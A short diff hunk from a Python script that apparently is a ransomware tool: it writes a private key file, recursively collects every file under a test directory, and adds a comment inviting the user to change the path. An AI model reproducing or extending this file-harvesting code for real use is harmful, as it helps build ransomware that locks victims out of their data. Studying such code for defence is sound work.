@@ -11,7 +11,7 @@ with open("privateKey.key", "wb") as privateKey:
 
 dosyalar = []
 
-for root, dir, files in os.walk("D:\RansomwareTest"):
+for root, dir, files in os.walk("D:\RansomwareTest"): # change path to test this tool 
         for items in fnmatch.filter(files, "*"):
                 dosya = root + "\\" + items
 
